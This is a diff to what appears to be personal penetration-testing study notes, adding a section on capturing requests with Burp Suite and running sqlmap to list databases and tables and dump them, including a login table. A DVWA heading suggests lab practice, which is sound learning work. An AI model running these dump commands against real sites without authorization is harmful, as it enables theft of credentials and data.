@@ -97,11 +97,18 @@
 * sqlmap -u "(url)" --cookie="(cookie val)" -D (website name) --tables
 * sqlmap -u "(url)" --cookie="(cookie val)" -D (website name) -T (longin table) --dump
 
-# 13 
+# 13 SQL BURPSUITE
+* open site
+* meneu > preferences > search proxy > manual proxy > http proxy 127.0.0.1 > port 8080 > check also use this proxy for ftp
+* burp suite > temp project > burp defaults > start burp >
+* Terminal
+* sqlmap -r (burp file directorry) --dbs
+* sqlmap -r (burp file directorry) --dbs -D (database namme) --tables --columns
+* sqlmap -r (burp file directorry) --dbs -D (database namme) --tables -T (table name) --dump
 
-# 14
+# 14 
 
-# 15
+# 15 SQLMAP
 
 # 16 HASH,DVWA
 * login with credentials
